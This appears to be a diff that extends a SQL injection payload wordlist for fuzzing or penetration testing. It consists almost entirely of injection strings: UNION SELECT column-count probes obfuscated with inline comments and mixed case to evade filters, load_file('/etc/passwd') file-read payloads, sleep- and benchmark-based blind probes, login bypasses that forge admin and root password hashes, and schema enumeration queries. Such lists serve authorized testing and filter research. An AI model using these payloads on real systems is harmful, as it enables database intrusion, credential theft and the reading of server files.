+/**/and/**//*union*/union/*select*/select+1,2,3,4/*
+/**/and/**//*union*/union/*select*/select+1,2,3/*
+/**/and/**//*union*/union/*select*/select+1,2/*
+/**/and/**//*union*/union/*select*/select+1/*
+/**/and/**/un/**/ion+sel/**/ect+1
+/**/and/**/un/**/ion+sel/**/ect+1,2
+/**/and/**/un/**/ion+sel/**/ect+1,2,3
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10--
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10/**/--
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10/**/--/**/-
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9--
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9/**/--
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9/**/--/**/-
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8--
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8/**/--
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8/**/--/**/-
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7--
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7/**/--
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7/**/--/**/-
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6--
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6/**/--
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6/**/--/**/-
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5--
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5/**/--
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5/**/--/**/-
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4--
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4/**/--
+/**/and/**/un/**/ion+sel/**/ect+1,2,3,4/**/--/**/-
+/**/and/**/un/**/ion+sel/**/ect+1,2,3--
+/**/and/**/un/**/ion+sel/**/ect+1,2,3/**/--
+/**/and/**/un/**/ion+sel/**/ect+1,2,3/**/--/**/-
+/**/and/**/un/**/ion+sel/**/ect+1,2--
+/**/and/**/un/**/ion+sel/**/ect+1,2/**/--
+/**/and/**/un/**/ion+sel/**/ect+1,2/**/--/**/-
+/**/and/**/un/**/ion+sel/**/ect+1--
+/**/and/**/un/**/ion+sel/**/ect+1/**/--
+/**/and/**/un/**/ion+sel/**/ect+1/**/--/**/-
+/**/and/**/unIon(((((((selEct(1))))))))
+/**/and/**/unIon(((((((selEct(1))))))))--
+/**/and/**/unIon(((((((selEct(1))))))))/**/--
+/**/and/**/unIon(((((((selEct(1))))))))/**/--/**/-
+/**/and/**/unIon(((((((selEct(1),(2))))))))
+/**/and/**/unIon(((((((selEct(1),(2))))))))--
+/**/and/**/unIon(((((((selEct(1),(2))))))))/**/--
+/**/and/**/unIon(((((((selEct(1),(2))))))))/**/--/**/-
+/**/and/**/unIon(((((((selEct(1),(2),(3))))))))
+/**/and/**/unIon(((((((selEct(1),(2),(3))))))))--
+/**/and/**/unIon(((((((selEct(1),(2),(3))))))))/**/--
+/**/and/**/unIon(((((((selEct(1),(2),(3))))))))/**/--/**/-
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4))))))))
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4))))))))--
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4))))))))/**/--
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4))))))))/**/--/**/-
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5))))))))
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5))))))))--
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5))))))))/**/--
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5))))))))/**/--/**/-
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))--
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))/**/--
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))/**/--/**/-
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))--
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))/**/--
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))/**/--/**/-
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--/**/-
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--/**/-
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--
+/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--/**/-
+/**/and/**/union(((((((select(1))))))))
+/**/and/**/union(((((((select(1))))))))--
+/**/and/**/union(((((((select(1))))))))/**/--
+/**/and/**/union(((((((select(1))))))))/**/--/**/-
+/**/and/**/union(((((((select(1),(2))))))))
+/**/and/**/union(((((((select(1),(2))))))))--
+/**/and/**/union(((((((select(1),(2))))))))/**/--
+/**/and/**/union(((((((select(1),(2))))))))/**/--/**/-
+/**/and/**/union(((((((select(1),(2),(3))))))))
+/**/and/**/union(((((((select(1),(2),(3))))))))--
+/**/and/**/union(((((((select(1),(2),(3))))))))/**/--
+/**/and/**/union(((((((select(1),(2),(3))))))))/**/--/**/-
+/**/and/**/union(((((((select(1),(2),(3),(4))))))))
+/**/and/**/union(((((((select(1),(2),(3),(4))))))))--
+/**/and/**/union(((((((select(1),(2),(3),(4))))))))/**/--
+/**/and/**/union(((((((select(1),(2),(3),(4))))))))/**/--/**/-
+/**/and/**/union(((((((select(1),(2),(3),(4),(5))))))))
+/**/and/**/union(((((((select(1),(2),(3),(4),(5))))))))--
+/**/and/**/union(((((((select(1),(2),(3),(4),(5))))))))/**/--
+/**/and/**/union(((((((select(1),(2),(3),(4),(5))))))))/**/--/**/-
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6))))))))
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6))))))))--
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6))))))))/**/--
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6))))))))/**/--/**/-
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))--
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))/**/--
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))/**/--/**/-
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--/**/-
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--/**/-
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--
+/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--/**/-
+/**/and/**/union/**/select/**/load_file("/etc/passwd")--
+/**/and/**/union/**/select/**/load_file("/etc/passwd")/**/
+/**/and/**/union/**/select/**/load_file("/etc/passwd")/**/--
+/**/and/**/union/**/select/**/load_file("/etc/passwd")/**/--/**/-/**/
+/**/or/**//*union*/union/*select*/select+1,2,3,4,5,6,7,8,9,10/*/**/
+/**/or/**//*union*/union/*select*/select+1,2,3,4,5,6,7,8,9/*
+/**/or/**//*union*/union/*select*/select+1,2,3,4,5,6,7,8/*
+/**/or/**//*union*/union/*select*/select+1,2,3,4,5,6,7/*
+/**/or/**//*union*/union/*select*/select+1,2,3,4,5,6/*
+/**/or/**//*union*/union/*select*/select+1,2,3,4,5/*
+/**/or/**//*union*/union/*select*/select+1,2,3,4/*
+/**/or/**//*union*/union/*select*/select+1,2,3/*
+/**/or/**//*union*/union/*select*/select+1,2/*
+/**/or/**//*union*/union/*select*/select+1/*
 /**/or/**/1/**/=/**/1
+/**/or/**/un/**/ion+sel/**/ect+1
+/**/or/**/un/**/ion+sel/**/ect+1,2
+/**/or/**/un/**/ion+sel/**/ect+1,2,3
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10--
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10/**/--
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10/**/--/**/-/**/
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9--
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9/**/--
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9/**/--/**/-
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8--
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8/**/--
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8/**/--/**/-
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7--
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7/**/--
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7/**/--/**/-
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6--
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6/**/--
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6/**/--/**/-
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5--
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5/**/--
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5/**/--/**/-
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4--
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4/**/--
+/**/or/**/un/**/ion+sel/**/ect+1,2,3,4/**/--/**/-
+/**/or/**/un/**/ion+sel/**/ect+1,2,3--
+/**/or/**/un/**/ion+sel/**/ect+1,2,3/**/--
+/**/or/**/un/**/ion+sel/**/ect+1,2,3/**/--/**/-
+/**/or/**/un/**/ion+sel/**/ect+1,2--
+/**/or/**/un/**/ion+sel/**/ect+1,2/**/--
+/**/or/**/un/**/ion+sel/**/ect+1,2/**/--/**/-
+/**/or/**/un/**/ion+sel/**/ect+1--
+/**/or/**/un/**/ion+sel/**/ect+1/**/--
+/**/or/**/un/**/ion+sel/**/ect+1/**/--/**/-
+/**/or/**/unIon(((((((selEct(1))))))))
+/**/or/**/unIon(((((((selEct(1))))))))--
+/**/or/**/unIon(((((((selEct(1))))))))/**/--
+/**/or/**/unIon(((((((selEct(1))))))))/**/--/**/-
+/**/or/**/unIon(((((((selEct(1),(2))))))))
+/**/or/**/unIon(((((((selEct(1),(2))))))))--
+/**/or/**/unIon(((((((selEct(1),(2))))))))/**/--
+/**/or/**/unIon(((((((selEct(1),(2))))))))/**/--/**/-
+/**/or/**/unIon(((((((selEct(1),(2),(3))))))))
+/**/or/**/unIon(((((((selEct(1),(2),(3))))))))--
+/**/or/**/unIon(((((((selEct(1),(2),(3))))))))/**/--
+/**/or/**/unIon(((((((selEct(1),(2),(3))))))))/**/--/**/-
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4))))))))
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4))))))))--
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4))))))))/**/--
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4))))))))/**/--/**/-
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5))))))))
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5))))))))--
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5))))))))/**/--
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5))))))))/**/--/**/-
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))--
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))/**/--
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))/**/--/**/-
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))--
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))/**/--
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))/**/--/**/-
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--/**/-
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--/**/-
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--
+/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--/**/-
+/**/or/**/union(((((((select(1))))))))
+/**/or/**/union(((((((select(1))))))))--
+/**/or/**/union(((((((select(1))))))))/**/--
+/**/or/**/union(((((((select(1))))))))/**/--/**/-
+/**/or/**/union(((((((select(1),(2))))))))
+/**/or/**/union(((((((select(1),(2))))))))--
+/**/or/**/union(((((((select(1),(2))))))))/**/--
+/**/or/**/union(((((((select(1),(2))))))))/**/--/**/-
+/**/or/**/union(((((((select(1),(2),(3))))))))
+/**/or/**/union(((((((select(1),(2),(3))))))))--
+/**/or/**/union(((((((select(1),(2),(3))))))))/**/--
+/**/or/**/union(((((((select(1),(2),(3))))))))/**/--/**/-
+/**/or/**/union(((((((select(1),(2),(3),(4))))))))
+/**/or/**/union(((((((select(1),(2),(3),(4))))))))--
+/**/or/**/union(((((((select(1),(2),(3),(4))))))))/**/--
+/**/or/**/union(((((((select(1),(2),(3),(4))))))))/**/--/**/-
+/**/or/**/union(((((((select(1),(2),(3),(4),(5))))))))
+/**/or/**/union(((((((select(1),(2),(3),(4),(5))))))))--
+/**/or/**/union(((((((select(1),(2),(3),(4),(5))))))))/**/--
+/**/or/**/union(((((((select(1),(2),(3),(4),(5))))))))/**/--/**/-
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6))))))))
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6))))))))--
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6))))))))/**/--
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6))))))))/**/--/**/-
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))--
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))/**/--
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))/**/--/**/-
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--/**/-
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--/**/-
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--
+/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--/**/-
+/**/or/**/union/**/select/**/load_file("/etc/passwd")--
+/**/or/**/union/**/select/**/load_file("/etc/passwd")/**/
+/**/or/**/union/**/select/**/load_file("/etc/passwd")/**/--
+/**/or/**/union/**/select/**/load_file("/etc/passwd")/**/--/**/-/**/
+/**/strcmp(left('password',1),/**/0x69)/**/=/**/1
+/**/strcmp(left('password',1),/**/0x69)/**/=/**/1--
+/**/strcmp(left('password',1),/**/0x69)/**/=/**/1/**/--
 /**/union/*&id=*/select/*&id=*/password/*&id=*/from/*&id=*/users
 /*UNION*/UNION/*SELECT*/SELECT+1,2,3,4,5,6,7,8,9,10/*
 /*UNION*/UNION/*SELECT*/SELECT+1,2,3,4,5,6,7,8,9/*
@@ -792,8 +2214,19 @@ $
 /*uni X on*/union/*sel X ect*/select+1,2,3/*
 /*uni X on*/union/*sel X ect*/select+1,2/*
 /*uni X on*/union/*sel X ect*/select+1/*
+/*union*/union/*select*/select+1,2,3,4,5,6,7,8,9,10/*
+/*union*/union/*select*/select+1,2,3,4,5,6,7,8,9/*
+/*union*/union/*select*/select+1,2,3,4,5,6,7,8/*
+/*union*/union/*select*/select+1,2,3,4,5,6,7/*
+/*union*/union/*select*/select+1,2,3,4,5,6/*
+/*union*/union/*select*/select+1,2,3,4,5/*
+/*union*/union/*select*/select+1,2,3,4/*
+/*union*/union/*select*/select+1,2,3/*
+/*union*/union/*select*/select+1,2/*
+/*union*/union/*select*/select+1/*
 0 %27 %A0 UNION %A0 ALL %A0 SELECT %A0 1,2,3 %26%26 20 %271
 0 or 1=1
+0xbf27
 1 and 1=1
 1 or 1=1
 1 or benchmark(10000000,MD5(1))#
@@ -812,6 +2245,14 @@ $
 1' and false union select 1,0x2720756e696f6e2073656c65637420312c3223--
 1' and false union select 1,0x2720756e696f6e2073656c65637420312c3223--+
 1' or '1'='1
+1') or 1>0 or ('1
+1') or 1>0 or ('1 --
+1') or 1>0 or ('1 -- -
+1') or 1>0 or ('1--
+1')/**/or/**/1>0/**/or/**/('1
+1')/**/or/**/1>0/**/or/**/('1--
+1')/**/or/**/1>0/**/or/**/('1/**/--
+1')/**/or/**/1>0/**/or/**/('1/**/--/**/-
 1'1
 1) or benchmark(10000000,MD5(1))#
 1) or pg_sleep(__TIME__)--
@@ -819,10 +2260,54 @@ $
 1)) or benchmark(10000000,MD5(1))#
 1)) or pg_sleep(__TIME__)--
 1)) or sleep(__TIME__)#
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 --
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 -- -
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2--
+11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2
+11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 --
+11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 -- -
+11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2--
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 --
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 -- -
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2--
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 --
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 -- -
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2--
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 --
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 -- -
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055--
 1234 " AND 1=0 UNION ALL SELECT "root", "81dc9bdb52d04dc20036dbd8313ed055
+1234 " AND 1=0 UNION ALL SELECT "root", "81dc9bdb52d04dc20036dbd8313ed055 --
+1234 " AND 1=0 UNION ALL SELECT "root", "81dc9bdb52d04dc20036dbd8313ed055 -- -
+1234 " AND 1=0 UNION ALL SELECT "root", "81dc9bdb52d04dc20036dbd8313ed055--
 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055 --
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055 -- -
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055--
 1234 ' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055
+1234 ' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055 --
+1234 ' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055 -- -
+1234 ' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055--
+1234" AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+1234" AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 --
+1234" AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 -- -
+1234" AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055--
+1234" AND 1=0 UNION ALL SELECT "root", "81dc9bdb52d04dc20036dbd8313ed055
+1234" AND 1=0 UNION ALL SELECT "root", "81dc9bdb52d04dc20036dbd8313ed055 --
+1234" AND 1=0 UNION ALL SELECT "root", "81dc9bdb52d04dc20036dbd8313ed055 -- -
+1234" AND 1=0 UNION ALL SELECT "root", "81dc9bdb52d04dc20036dbd8313ed055--
+1234' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+1234' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055 --
+1234' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055 -- -
+1234' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055--
+1234' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055
+1234' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055 --
+1234' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055 -- -
+1234' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055--
 1;SELECT%20*
 21 %
 23 OR 1=1
@@ -836,6 +2321,12 @@ $
 ;SELECT PG_SLEEP(5) --
 ;SELECT PG_SLEEP(5) -- -
 ;SELECT PG_SLEEP(5)--
+;select+1&id=2,3+from+users+where+id=1
+;select+1&id=2,3+from+users+where+id=1 --
+;select+1&id=2,3+from+users+where+id=1 -- -
+;select+1&id=2,3+from+users+where+id=1--
+;select+1&id=2,3+from+users+where+id=1/**/--
+;select+1&id=2,3+from+users+where+id=1/**/--/**/-
 ;waitfor delay '0:0:__TIME__'--
 <
 <>"'%;)(&+
@@ -845,15 +2336,39 @@ $
 IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
 PRINT
 PRINT @@variable
+SELECT 0x5045
+SELECT 0x5045 --
+SELECT 0x5045 -- -
+SELECT 0x5045--
+SELECT CHAR(0x66)
+SELECT CHAR(0x66) --
+SELECT CHAR(0x66) -- -
+SELECT CHAR(0x66)--
 SELECT CHR(65)||CHR(66)||CHR(67)
+SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))
+SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82)) --
+SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82)) -- -
+SELECT CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))--
 SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
 SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
 SELECT schemaname FROM syscat.schemata;
 SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
+SELECT/**/0x5045--
+SELECT/**/0x5045/**/--
+SELECT/**/0x5045/**/--/**/-
+SELECT/**/CHAR(0x66)
+SELECT/**/CHAR(0x66)--
+SELECT/**/CHAR(0x66)/**/--
+SELECT/**/CHAR(0x66)/**/--/**/-
+SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))
+SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))--
+SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))/**/--
